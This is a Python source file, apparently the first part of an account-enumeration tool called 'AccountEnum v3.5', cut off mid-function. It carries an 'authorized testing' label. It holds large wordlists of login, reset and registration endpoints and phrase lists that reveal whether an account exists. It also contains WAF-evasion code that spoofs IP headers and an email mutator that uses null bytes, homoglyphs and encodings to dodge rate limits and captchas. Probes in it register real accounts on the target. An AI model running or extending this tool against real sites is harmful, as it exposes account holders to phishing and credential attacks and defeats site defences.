#!/usr/bin/env python3
"""
AccountEnum v3.5 — FBI/NCA-Tier Deep Enumeration Engine
Authorized Bug Bounty / Penetration Testing

v3.5 Additions:
    - Source Map Mining: extract hidden API routes from JS .map files + bundle analysis
    - BaaS Auth Detection: Firebase/Supabase/Cognito/Auth0/Okta auto-detection + known enum vectors
    - SSO Provider Probe: Azure AD GetCredentialType email enum + Okta/OneLogin/Ping/Keycloak detection
    - XML-RPC/SOAP Probe: WordPress xmlrpc.php + wp-json users + Joomla/Drupal legacy paths
    - Pre-validation Discovery: registration field validation endpoint detection (24 patterns)
    - Multi-tenant/Workspace Lookup: org/team/workspace/domain lookup enumeration
    - API Version Brute: systematic v1-v10 auth endpoint sweep
    - Double-Submit Differential: submit email twice, detect "already registered" on 2nd response
    - ETag/Cache Header Differential: cache validation header comparison reveals existence
    - Error Classification Engine: deep error category analysis (7 categories) + cross-comparison
    - Password Reset Token Analysis: token entropy/length/issuance differential per account
    - Response Compression Oracle: gzip Content-Length amplification for subtle body differences
    - Retry-After Header Differential: timing header comparison per user
    - Phase 1 Speed Fix: HEAD pre-check + 3 probes + 30-40 threads + progress counter

v3.4 Additions:
    - SMTP Verification: VRFY + RCPT TO on MX records (direct email existence)
    - DNS Intelligence: MX/SPF/DKIM/DMARC/NS analysis + cloud/email provider detection
    - TLS Certificate Intelligence: SAN domain extraction + issuer fingerprinting
    - JWT Token Analysis: extract + decode + compare claims between accounts
    - CORS Misconfiguration Scanner: origin reflection + credential leak detection
    - Subdomain Takeover Detection: dangling CNAME check (16 services)
    - WebSocket Endpoint Probing: ws:// auth endpoint detection
    - RESTful Path Parameter Fuzzing: /api/users/{email} pattern discovery
    - GraphQL Batch Enumeration: batched mutation queries
    - Unicode/Encoding Bypass: NFKC/NFC/NFKD normalization + homoglyphs + 15 encoding tricks
    - HTTP Method Override Bypass: X-HTTP-Method-Override + _method param
    - Rate Limit Mapping: exact window/threshold fingerprinting
    - Response Entropy Analysis: Shannon entropy comparison
    - Behavioral Clustering: response pattern grouping
    - Anti-fingerprint headers + cloud provider detection

v3.3 Additions:
    - OSINT Recon: 16 free third-party sources (crt.sh, RapidDNS, HackerTarget,
      BufferOver, AlienVault OTX, URLScan.io, ThreatCrowd, Wayback Machine,
      Wayback CDX, Archive.org CDX, ViewDNS, DNS bruteforce, ThreatMiner,
      Riddler.io, CommonCrawl, Web Archive Sitemap)
    - Captchaless enforcement: auto-deprioritize captcha endpoints, focus captcha-free vectors
    - Endpoint scoring: rank by usefulness (captcha-free + response differential = top)
    - Mobile API discovery: probe mobile-specific API patterns (captcha-free)
    - OSINT subdomain + historical URL feed into discovery pipeline
    - Auto auth-subdomain detection from OSINT results

v3.2 Additions:
    - Verification re-check (every hit gets re-confirmed with 2nd request)
    - Cross-endpoint correlation (multiple endpoints agree = boosted confidence)
    - Adaptive thread scaling (ramp up when no rate limits detected)
    - Instant live reporting (results written to file in real-time)
    - Multi-param brute (try multiple email field names per endpoint)
    - Connection pool boost (50 connections for high throughput)
    - Auto-retry with different content types on failure
    - Enhanced WAF evasion (request spacing jitter, header randomization)

Features (30 phases, 80+ techniques):
    - OSINT recon from 16 free sources (subdomain + historical URL harvesting)
    - Captchaless-first design: captcha-free endpoints scored highest
    - SMTP VRFY/RCPT TO email verification (direct MX-level check)
    - DNS intelligence: MX/SPF/DKIM/DMARC/NS + cloud/email provider fingerprint
    - TLS certificate intelligence: SAN domain extraction + issuer ID
    - CORS misconfiguration scanner: origin reflection + credential leaks
    - Subdomain takeover detection: dangling CNAME check (16 services)
    - WebSocket endpoint probing: ws:// auth detection
    - RESTful path parameter fuzzing: /api/users/{email} patterns
    - GraphQL batch enumeration: batched mutation queries
    - Unicode/encoding bypass: NFKC/NFC normalization + homoglyphs + 15 tricks
    - HTTP method override bypass: X-HTTP-Method-Override + _method param
    - Rate limit mapping: exact window/threshold fingerprinting
    - Response entropy analysis: Shannon entropy comparison
    - Behavioral clustering: response pattern grouping
    - JWT token analysis: extract + decode + compare claims
    - Auto endpoint discovery + form crawling + JS/SPA extraction
    - Swagger/OpenAPI + sitemap.xml + source map discovery
    - SPA framework detection (Next.js, React, Vue, Angular, Nuxt, Svelte)
    - Deep probe fallback when standard discovery finds nothing
    - Mobile API discovery (apps often skip captcha)
    - Multi-vector enumeration (login, register, reset, API, GraphQL, OTP, billing)
    - Proxy rotation (HTTP/SOCKS4/SOCKS5) with parallel health checks
    - Adaptive rate limiting with backoff
    - WAF detection and vendor-specific evasion
    - IP rotation via header spoofing (16 header variants)
    - Timing-based oracle attacks (multi-sample z-score statistical)
    - X-Runtime server-side timing analysis
    - CSRF auto-extraction (input, meta, regex)
    - Captcha enforcement detection (recaptcha, hcaptcha, turnstile, funcaptcha, geetest)
    - Response fingerprinting (headers, cookies, body, redirects, JSON fields)
    - Account lockout detection + safety abort
    - Password policy enumeration
    - API version discovery
    - GraphQL introspection + mutation fuzzing
    - OTP/2FA endpoint detection
    - Subdomain discovery + multi-origin testing
    - IDOR enumeration on user/invoice/billing endpoints
    - Rate limit bypass via email mutation (case, dots, plus tags, unicode, encoding)
    - Catch-all / wildcard email detection
    - Registration side-effect detection
    - OAuth authorization flow enumeration
    - Multi-step auth flow detection (login -> 2FA chain)
    - Session token entropy analysis
    - Resume/checkpoint support
    - Plugin system for custom signal detectors
    - JSON / Form / XML / GraphQL payload formats
    - HTML + JSON + CSV report export (dark theme)
    - Cookie + session analysis
    - Header leak detection
    - Concurrent with adaptive thread scaling

Usage:
    python3 account_enum.py -t https://target.com -e emails.txt
    python3 account_enum.py -t https://target.com --single user@test.com -p proxies.txt
    python3 account_enum.py -t https://target.com -e emails.txt -o report --format all
    python3 account_enum.py -t https://target.com -e emails.txt --full --timing --threads 15
    python3 account_enum.py -t https://target.com -e emails.txt --resume checkpoint.json
"""

import argparse
import sys
import os
import json
import csv
import time
import random
import hashlib
import re
import string
import socket
import ssl
import math
import itertools
import statistics
import urllib.parse
import difflib
import textwrap
import html as html_module
import importlib.util
import threading
from dataclasses import dataclass, field
from typing import Optional, Any
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from collections import defaultdict, Counter
from io import StringIO
from pathlib import Path

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class _Dummy:
        def __getattr__(self, _): return ""
    Fore = Style = _Dummy()

try:
    import socks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False


BANNER = f"""{Fore.CYAN}
 +===========================================================+
 |  AccountEnum v3.5 - FBI/NCA-Tier Deep Enumeration           |
 |  SMTP + DNS Intel + JWT + CORS + Subdomain Takeover        |
 |  WebSocket + Unicode Bypass + GraphQL Batch + Entropy      |
 |  16 OSINT Sources + Captchaless + Path Fuzz + Clustering   |
 |  Verified Accuracy + High Throughput + Instant Reporting   |
 |           Authorized Testing Only                          |
 +===========================================================+
{Style.RESET_ALL}"""

class Vector(Enum):
    LOGIN = "login"
    REGISTER = "register"
    PASSWORD_RESET = "password_reset"
    DIRECT_CHECK = "direct_check"
    GRAPHQL = "graphql"
    OTP = "otp"
    BILLING = "billing"
    API_USER = "api_user"
    OAUTH = "oauth"
    SSO = "sso"
    INVITE = "invite"
    NEWSLETTER = "newsletter"
    TIMING = "timing"
    IDOR = "idor"
    UNKNOWN = "unknown"

class Confidence(Enum):
    CONFIRMED = "confirmed"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    UNKNOWN = "unknown"

AUTH_PATHS = {
    Vector.LOGIN: [
        "/login", "/signin", "/sign-in", "/log-in",
        "/auth/login", "/auth/signin", "/auth/sign-in",
        "/api/login", "/api/auth/login", "/api/auth/signin",
        "/api/v1/login", "/api/v2/login", "/api/v3/login",
        "/api/v1/auth/login", "/api/v1/auth/signin",
        "/api/v2/auth/login", "/api/v2/auth/signin",
        "/account/login", "/user/login", "/users/sign_in",
        "/session", "/sessions", "/api/sessions", "/api/v1/sessions",
        "/rest/auth/1/session", "/wp-login.php", "/wp-json/jwt-auth/v1/token",
        "/identity/login", "/identity/authenticate",
        "/api/identity/login", "/api/authenticate",
        "/api/v1/authenticate", "/api/auth/authenticate",
        "/auth/credentials", "/api/auth/credentials",
        "/api/v1/auth/credentials", "/api/v1/token",
        "/api/token", "/token", "/auth/token",
        "/connect/token", "/oauth2/token",
        "/auth/email/login", "/api/auth/email",
        "/api/v1/auth/email", "/api/v1/auth/email/login",
        "/j_spring_security_check", "/j_security_check",
        "/auth/realms/master/protocol/openid-connect/token",
        "/api/v1/session", "/api/v2/session",
        "/user/signin", "/member/login", "/member/signin",
        "/customer/login", "/api/customer/login",
        "/api/v1/customer/login", "/auth/local",
        "/api/auth/local", "/api/v1/auth/local",
        "/login/email", "/api/login/email",
        "/api/v1/login/email", "/auth/login/email",
        "/internal/login", "/web/login", "/app/login",
        "/exchange/login", "/trade/login",
        "/api/exchange/login", "/api/trade/login",
    ],
    Vector.REGISTER: [
        "/register", "/signup", "/sign-up",
        "/auth/register", "/auth/signup", "/auth/sign-up",
        "/api/register", "/api/auth/register", "/api/auth/signup",
        "/api/v1/register", "/api/v2/register", "/api/v3/register",
        "/api/v1/auth/register", "/api/v2/auth/register",
        "/api/v1/users", "/api/users", "/users",
        "/account/register", "/user/register", "/join",
        "/create-account", "/api/create-account",
        "/api/v1/signup", "/api/v2/signup",
        "/api/auth/email/register", "/api/v1/auth/email/register",
        "/api/v1/account/create", "/api/account/create",
        "/identity/register", "/identity/signup",
        "/api/identity/register", "/onboarding",
        "/api/onboarding", "/api/v1/onboarding",
        "/register/email", "/api/register/email",
        "/signup/email", "/api/signup/email",
        "/auth/register/email", "/member/register",
        "/customer/register", "/api/customer/register",
        "/exchange/register", "/trade/register",
    ],
    Vector.PASSWORD_RESET: [
        "/forgot-password", "/forgot", "/password/reset", "/auth/forgot",
        "/api/forgot-password", "/api/auth/forgot-password",
        "/api/v1/forgot-password", "/api/v1/password/reset",
        "/api/v1/auth/forgot", "/api/v2/forgot-password",
        "/password/email", "/account/recover", "/auth/recover",
        "/api/password/reset", "/api/auth/reset-password",
        "/reset-password", "/api/reset-password",
        "/users/password", "/account/forgot",
        "/api/v1/auth/forgot-password", "/api/v2/auth/forgot-password",
        "/api/v1/password/forgot", "/api/v2/password/forgot",
        "/api/v1/password/email", "/api/v2/password/email",
        "/api/v1/reset-password", "/api/v2/reset-password",
        "/api/v3/forgot-password", "/api/v3/password/reset",
        "/password/forgot", "/password/recover",
        "/api/password/forgot", "/api/password/recover",
        "/identity/forgot-password", "/identity/password/reset",
        "/auth/password/reset", "/auth/reset-password",
        "/auth/forgot-password", "/recover", "/api/recover",
        "/account/password/reset", "/api/account/password/reset",
        "/api/v1/account/password/reset",
        "/forgot_password", "/api/forgot_password",
        "/api/v1/forgot_password",
    ],
    Vector.DIRECT_CHECK: [
        "/api/users/check", "/api/user/exists", "/api/account/check",
        "/api/v1/users/check", "/api/v1/check-email",
        "/api/auth/check-email", "/api/email/check", "/api/email/verify",
        "/api/validate/email", "/api/v1/validate/email",
        "/api/check-username", "/api/v1/check-username",
        "/api/v1/users/exists", "/api/v1/email/exists",
        "/api/v1/account/exists", "/api/availability",
        "/api/v1/availability", "/api/v1/validate/username",
        "/api/auth/email-check", "/api/auth/verify-email",
        "/api/v2/users/check", "/api/v2/check-email",
        "/api/v2/email/check", "/api/v2/validate/email",
        "/api/v3/users/check", "/api/v3/check-email",
        "/api/user/check", "/api/user/email/check",
        "/api/v1/user/check", "/api/v1/user/email/check",
        "/api/check/email", "/api/v1/check/email",
        "/api/auth/check", "/api/v1/auth/check",
        "/api/email-exists", "/api/v1/email-exists",
        "/api/email/exists", "/api/v1/email/available",
        "/api/v1/email/availability", "/api/email/availability",
        "/api/account/email/check", "/api/v1/account/email/check",
        "/api/identity/check", "/api/v1/identity/check",
        "/api/identity/email", "/api/v1/identity/email",
        "/api/user/validate", "/api/v1/user/validate",
        "/api/users/email", "/api/v1/users/email",
        "/api/lookup", "/api/v1/lookup",
        "/api/lookup/email", "/api/v1/lookup/email",
        "/check-email", "/email-check", "/validate-email",
    ],
    Vector.GRAPHQL: [
        "/graphql", "/api/graphql", "/gql", "/api/gql",
        "/graphql/v1", "/api/graphql/v1",
        "/graphql/v2", "/api/graphql/v2",
        "/query", "/api/query",
    ],
    Vector.OTP: [
        "/api/otp/send", "/api/v1/otp/send", "/api/auth/otp",
        "/api/send-otp", "/api/v1/send-otp", "/api/verify-otp",
        "/api/v1/verify-otp", "/api/auth/send-code",
        "/api/auth/verify-code", "/api/2fa/send", "/api/mfa/send",
        "/api/v1/2fa/send", "/api/v1/mfa/send",
        "/api/otp/request", "/api/v1/otp/request",
        "/api/v2/otp/send", "/api/v2/otp/request",
        "/api/code/send", "/api/v1/code/send",
        "/api/verification/send", "/api/v1/verification/send",
        "/api/auth/otp/send", "/api/v1/auth/otp/send",
        "/api/auth/2fa", "/api/v1/auth/2fa",
    ],
    Vector.BILLING: [
        "/api/billing", "/api/payments", "/api/subscriptions",
        "/api/v1/billing", "/api/v1/payments", "/api/invoices",
        "/api/v1/invoices", "/api/v1/subscriptions",
        "/api/billing/check", "/api/v1/billing/customer",
        "/billing/portal", "/api/stripe/customer",
        "/api/v2/billing", "/api/v2/payments",
    ],
    Vector.API_USER: [
        "/api/users/0", "/api/users/1", "/api/v1/users/1",
        "/api/v1/users/me", "/api/me", "/api/v1/me",
        "/api/user", "/api/v1/user", "/api/account",
        "/api/v1/account", "/api/profile", "/api/v1/profile",
        "/api/v1/users/search", "/api/users/search",
        "/api/v1/users/lookup", "/api/users/lookup",
        "/api/v2/users/me", "/api/v2/me",
        "/api/v2/user", "/api/v2/account",
        "/api/v2/profile", "/api/v2/users/search",
        "/api/userinfo", "/api/v1/userinfo",
    ],
    Vector.OAUTH: [
        "/oauth/authorize", "/oauth/token", "/oauth2/authorize",
        "/api/oauth/authorize", "/auth/oauth",
        "/.well-known/openid-configuration",
        "/oauth2/token", "/connect/authorize",
        "/connect/token", "/connect/userinfo",
        "/.well-known/oauth-authorization-server",
        "/auth/authorize", "/api/auth/authorize",
    ],
    Vector.SSO: [
        "/sso/login", "/sso/saml", "/auth/sso", "/api/sso/check",
        "/api/v1/sso/check", "/api/auth/sso",
        "/saml/login", "/saml2/login",
        "/api/sso/login", "/api/v1/sso/login",
    ],
    Vector.INVITE: [
        "/api/invite", "/api/v1/invite", "/api/invitations",
        "/api/v1/invitations", "/invite/check",
        "/api/v2/invite", "/api/v1/invite/check",
    ],
    Vector.NEWSLETTER: [
        "/api/newsletter", "/api/subscribe", "/api/v1/subscribe",
        "/newsletter/subscribe", "/api/mailing-list",
        "/api/v1/newsletter", "/api/email/subscribe",
    ],
}

IDOR_PATHS = [
    "/api/users/{id}", "/api/v1/users/{id}", "/api/v2/users/{id}",
    "/api/user/{id}", "/api/v1/user/{id}",
    "/api/profiles/{id}", "/api/v1/profiles/{id}",
    "/api/account/{id}", "/api/v1/account/{id}",
    "/api/invoices/{id}", "/api/v1/invoices/{id}",
    "/api/billing/{id}", "/api/v1/billing/{id}",
    "/api/orders/{id}", "/api/v1/orders/{id}",
    "/api/subscriptions/{id}", "/api/v1/subscriptions/{id}",
    "/users/{id}.json", "/members/{id}",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

MOBILE_USER_AGENTS = [
    "okhttp/4.12.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UQ1A.240205.002)",
    "com.app.client/3.0 CFNetwork/1490.0.4 Darwin/23.2.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
]

EMAIL_PARAMS = [
    "email", "mail", "user_email", "username", "user", "login",
    "account", "emailAddress", "user_name", "identifier", "emailaddress",
    "user_login", "login_id", "email_address", "userEmail",
]
PASS_PARAMS = [
    "password", "pass", "passwd", "pwd", "secret",
    "user_password", "passphrase", "login_password",
]

EXISTING_SIGNALS = [
    "already registered", "already exists", "account exists",
    "email is taken", "is already in use", "email taken",
    "user already exists", "duplicate", "address is associated",
    "email already", "account with this email", "try logging in",
    "already have an account", "existing account",
    "username is taken", "username already", "that email is taken",
    "email address is already", "is already registered",
    "has already been taken", "this account already exists",
    "already in use", "email_taken", "user_exists",
    "invalid password", "wrong password", "incorrect password",
    "password is incorrect", "bad credentials", "authentication failed",
    "invalid credentials", "wrong credentials",
    "account is locked", "account locked", "too many attempts",
    "account disabled", "account suspended", "deactivated",
    "password expired", "must reset your password",
    "verify your email", "check your email", "verification email",
    "we sent", "email has been sent", "reset link sent",
    "recovery email sent", "instructions sent",
    "credentials are incorrect", "login failed",
    "email or password is incorrect", "password does not match",
    "sign in failed", "login unsuccessful",
    "this email is registered", "email is registered",
    "email address already registered", "email address is registered",
    "account already exists", "a]ccount with that email",
    "email is already taken", "this email is already in use",
    "email has been registered", "email is in use",
    "an account with this email already exists",
    "this email address is already registered",
    "someone already has that email", "that email is already registered",
    "email address already exists", "user with this email",
    "2fa required", "two-factor", "mfa required",
    "enter your 2fa", "verification code", "otp sent",
    "code sent to your email", "we've sent a code",
    "please enter the code", "enter the verification code",
    "a password reset link", "password reset email",
    "we've sent you an email", "check your inbox",
    "link has been sent", "email was sent",
    "reset instructions", "reset your password",
    "password incorrect", "wrong email or password",
    "email/password incorrect", "email and password don't match",
    "unsuccessful login", "unable to sign in",
]

NOT_FOUND_SIGNALS = [
    "user not found", "no account", "email not found",
    "doesn't exist", "does not exist", "not registered",
    "no user", "couldn't find", "could not find",
    "invalid email", "unknown user", "unknown email",
    "email is available", "username is available",
    "no account found", "not associated with any account",
    "no matching account", "user_not_found", "email_not_found",
    "account not found", "invalid user",
    "no account with that email", "no user found",
    "no account exists", "email not registered",
    "email does not exist", "user does not exist",
    "account does not exist", "email address not found",
    "no user with this email", "this email is not registered",
    "email not associated", "no record found",
    "unregistered email", "email is not in use",
    "email doesn't exist", "account doesn't exist",
    "we couldn't find an account", "we couldn't find your account",
    "we don't recognize this email", "no such user",
    "invalid email address", "email address is not valid",
    "that email isn't registered", "no account with this email",
    "this email is available", "email available",
]

RATE_LIMIT_SIGNALS = [
    "rate limit", "too many requests", "throttled",
    "try again later", "slow down", "temporarily blocked",
    "exceeded", "quota", "rate_limited",
]

WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "__cfduid", "cf-cache-status", "cloudflare"],
    "akamai": ["akamai", "x-akamai", "akamaighost"],
    "aws_waf": ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
    "incapsula": ["incap_ses", "visid_incap", "x-cdn", "imperva"],
    "sucuri": ["x-sucuri", "sucuri"],
    "f5_big_ip": ["bigipserver", "x-wa-info"],
    "modsecurity": ["mod_security", "modsecurity"],
    "fortinet": ["fortigate", "fortiwaf"],
}

SPOOF_HEADERS_POOL = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
    "X-Forwarded", "Forwarded-For", "X-Forwarded-Host",
    "X-ProxyUser-Ip", "Client-IP", "True-Client-IP",
    "Cluster-Client-IP", "X-Cluster-Client-IP",
    "Forwarded", "Via",
    "CF-Connecting-IP", "Fastly-Client-IP",
    "X-Azure-ClientIP", "X-Azure-SocketIP",
    "Akamai-Origin-Hop", "X-Akamai-Client-IP",
    "X-Original-Forwarded-For", "X-Backend-Host",
]


@dataclass
class EndpointInfo:
    url: str
    method: str = "POST"
    vector: Vector = Vector.UNKNOWN
    email_param: str = "email"
    password_param: str = "password"
    content_type: str = "application/json"
    requires_csrf: bool = False
    csrf_field: str = ""
    csrf_token: str = ""
    captcha_enforced: bool = False
    captcha_type: str = ""
    accepts_phone: bool = False
    phone_param: str = "phone"
    rate_limited: bool = False
    rate_limit_info: str = ""
    waf: str = ""
    alive: bool = True
    status_code: int = 0
    alt_methods: list = field(default_factory=list)
    response_headers: dict = field(default_factory=dict)

@dataclass
class EnumResult:
    email: str
    vector: str
    endpoint: str
    exists: Optional[bool] = None
    confidence: Confidence = Confidence.UNKNOWN
    evidence: list = field(default_factory=list)
    status_code: int = 0
    response_time: float = 0.0
    content_length: int = 0
    response_headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    redirect_url: str = ""
    raw_body_hash: str = ""

@dataclass
class Baseline:
    avg_time: float = 0.0
    std_time: float = 0.0
    min_time: float = 0.0
    max_time: float = 0.0
    avg_length: float = 0.0
    std_length: float = 0.0
    statuses: list = field(default_factory=list)
    body_hashes: list = field(default_factory=list)
    bodies: list = field(default_factory=list)
    header_keys: set = field(default_factory=set)
    cookie_keys: set = field(default_factory=set)
    redirect_urls: list = field(default_factory=list)
    content_types: list = field(default_factory=list)
    x_runtime_avg: float = 0.0
    x_runtime_std: float = 0.0


# ---- Email Mutator ----

class EmailMutator:
    @staticmethod
    def generate(email: str) -> list[str]:
        local, domain = email.split("@", 1)
        variants = [email]

        variants.append(email.upper())
        variants.append(email.lower())
        variants.append(f"{local.upper()}@{domain.lower()}")
        half = len(local) // 2
        variants.append(f"{local[:half].upper()}{local[half:].lower()}@{domain}")

        if "." in local:
            variants.append(f"{local.replace('.', '')}@{domain}")
        if "." not in local and len(local) > 2:
            variants.append(f"{local[0]}.{local[1:]}@{domain}")

        for tag in ["test", "x", "1", "a", "probe", "bb"]:
            variants.append(f"{local}+{tag}@{domain}")

        variants.append(f" {email}")
        variants.append(f"{email} ")
        variants.append(f" {email} ")

        variants.append(f"{local}@{domain}\x00")
        variants.append(f"{local}\x00ignored@{domain}")

        variants.append(urllib.parse.quote(email))
        variants.append(email.replace("@", "%40"))

        for char_orig, char_uni in [("a", "а"), ("e", "е"), ("o", "о")]:
            if char_orig in local.lower():
                variants.append(f"{local.replace(char_orig, char_uni, 1)}@{domain}")

        seen = set()
        unique = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique


# ---- Catch-All Detector ----

class CatchAllDetector:
    def __init__(self, target: str, request_fn):
        self.target = target
        self._request = request_fn
        self.is_catchall: Optional[bool] = None

    def detect(self, endpoints: list[EndpointInfo]) -> bool:
        probe_emails = [
            f"catchall_probe_{hashlib.md5(os.urandom(8)).hexdigest()[:16]}@{urllib.parse.urlparse(self.target).hostname}",
            f"xyznotreal_{hashlib.md5(os.urandom(8)).hexdigest()[:16]}@{urllib.parse.urlparse(self.target).hostname}",
            f"aaadoesnotexist_{hashlib.md5(os.urandom(8)).hexdigest()[:16]}@{urllib.parse.urlparse(self.target).hostname}",
        ]
        positive_count = 0
        tested = 0
        for ep in endpoints[:3]:
            if ep.captcha_enforced or ep.vector == Vector.GRAPHQL:
                continue
            for probe in probe_emails[:2]:
                tested += 1
                data = {ep.email_param: probe}
                if ep.vector in (Vector.LOGIN, Vector.REGISTER):
                    data[ep.password_param] = f"CatchAll!{hashlib.md5(os.urandom(4)).hexdigest()[:6]}Xx"
                try:
                    if ep.content_type == "application/json":
                        resp = self._request("POST", ep.url, json=data, timeout=15)
                    else:
                        resp = self._request("POST", ep.url, data=data, timeout=15)
                except Exception:
                    continue
                if resp is None:
                    continue
                body = resp.text.lower()
                if any(sig in body for sig in EXISTING_SIGNALS):
                    positive_count += 1

        if tested == 0:
            self.is_catchall = None
            return False
        ratio = positive_count / tested
        self.is_catchall = ratio > 0.6
        return self.is_catchall


# ---- Registration Side-Effect Detector ----

class RegistrationSideEffectDetector:
    def __init__(self, request_fn):
        self._request = request_fn
        self.creates_accounts = False
        self.sends_emails = False

    def test(self, ep: EndpointInfo) -> dict:
        if ep.vector != Vector.REGISTER:
            return {}
        probe = f"sideeffect_probe_{hashlib.md5(os.urandom(8)).hexdigest()[:10]}@example.com"
        pwd = f"SideEff!{hashlib.md5(os.urandom(4)).hexdigest()[:6]}Xx"
        data = {
            ep.email_param: probe,
            ep.password_param: pwd,
            "name": "SideEffect Probe",
            "terms": True,
        }
        try:
            if ep.content_type == "application/json":
                resp = self._request("POST", ep.url, json=data, timeout=15)
            else:
                resp = self._request("POST", ep.url, data=data, timeout=15)
        except Exception:
            return {"error": "request_failed"}
        if resp is None:
            return {"error": "no_response"}
        body = resp.text.lower()
        result = {"status": resp.status_code, "creates_account": False, "sends_email": False}
        if resp.status_code in (200, 201):
            if any(kw in body for kw in ("created", "success", "welcome", "registered", "account created")):
                result["creates_account"] = True
                self.creates_accounts = True
            if any(kw in body for kw in ("verification email", "confirm your email", "we sent", "check your inbox")):
                result["sends_email"] = True
                self.sends_emails = True
        return result


# ---- Session Token Analyzer ----

class SessionAnalyzer:
    @staticmethod
    def entropy(token: str) -> float:
        if not token:
            return 0.0
        freq: dict[str, int] = {}
        for c in token:
            freq[c] = freq.get(c, 0) + 1
        length = len(token)
        ent = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                ent -= p * math.log2(p)
        return ent

    @staticmethod
    def compare_tokens(existing_tokens: list[str], nonexistent_tokens: list[str]) -> dict:
        if not existing_tokens or not nonexistent_tokens:
            return {"diff": False}
        e_ent = [SessionAnalyzer.entropy(t) for t in existing_tokens]
        n_ent = [SessionAnalyzer.entropy(t) for t in nonexistent_tokens]
        e_len = [len(t) for t in existing_tokens]
        n_len = [len(t) for t in nonexistent_tokens]
        return {
            "diff": abs(statistics.mean(e_ent) - statistics.mean(n_ent)) > 0.5 or
                    abs(statistics.mean(e_len) - statistics.mean(n_len)) > 4,
            "existing_entropy_avg": statistics.mean(e_ent),
            "nonexistent_entropy_avg": statistics.mean(n_ent),
            "existing_length_avg": statistics.mean(e_len),
            "nonexistent_length_avg": statistics.mean(n_len),
        }


# ---- Plugin System ----

class PluginManager:
    def __init__(self, plugin_dir: Optional[str] = None):
        self.plugins: list[Any] = []
        if plugin_dir and os.path.isdir(plugin_dir):
            self._load_from_dir(plugin_dir)

    def _load_from_dir(self, plugin_dir: str):
        for fname in sorted(os.listdir(plugin_dir)):
            if fname.endswith(".py") and not fname.startswith("_"):
                path = os.path.join(plugin_dir, fname)
                try:
                    spec = importlib.util.spec_from_file_location(fname[:-3], path)
                    if spec and spec.loader:
                        mod = importlib.util.module_from_spec(spec)
                        spec.loader.exec_module(mod)
                        if hasattr(mod, "Plugin"):
                            self.plugins.append(mod.Plugin())
                            print(f"  {Fore.GREEN}[PLUGIN] Loaded: {fname}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"  {Fore.YELLOW}[PLUGIN] Failed: {fname} ({e}){Style.RESET_ALL}")

    def run_signal_detectors(self, resp: requests.Response, baseline: "Baseline", signals: list):
        for plugin in self.plugins:
            if hasattr(plugin, "detect_signal"):
                try:
                    extra = plugin.detect_signal(resp, baseline)
                    if extra:
                        signals.extend(extra)
                except Exception:
                    pass

    def run_payload_generators(self, email: str, ep: EndpointInfo) -> list[dict]:
        payloads = []
        for plugin in self.plugins:
            if hasattr(plugin, "generate_payload"):
                try:
                    p = plugin.generate_payload(email, ep)
                    if p:
                        payloads.append(p)
                except Exception:
                    pass
        return payloads


# ---- Checkpoint / Resume ----

class Checkpoint:
    def __init__(self, path: Optional[str] = None):
        self.path = path
        self.completed_emails: set[str] = set()
        self.completed_endpoints: set[str] = set()
        self.results: list[dict] = []
        if path and os.path.isfile(path):
            self._load()

    def _load(self):
        try:
            with open(self.path) as f:
                data = json.load(f)
            self.completed_emails = set(data.get("completed_emails", []))
            self.completed_endpoints = set(data.get("completed_endpoints", []))
            self.results = data.get("results", [])
            print(f"  {Fore.GREEN}[RESUME] Loaded checkpoint: {len(self.completed_emails)} emails done{Style.RESET_ALL}")
        except Exception:
            pass

    def save(self, results: list["EnumResult"]):
        if not self.path:
            return
        data = {
            "completed_emails": list(self.completed_emails),
            "completed_endpoints": list(self.completed_endpoints),
            "results": [
                {
                    "email": r.email, "exists": r.exists,
                    "confidence": r.confidence.value, "vector": r.vector,
                    "endpoint": r.endpoint, "evidence": r.evidence,
                }
                for r in results if r.exists is True
            ],
            "timestamp": datetime.now().isoformat(),
        }
        try:
            with open(self.path, "w") as f:
                json.dump(data, f, indent=2)
        except Exception:
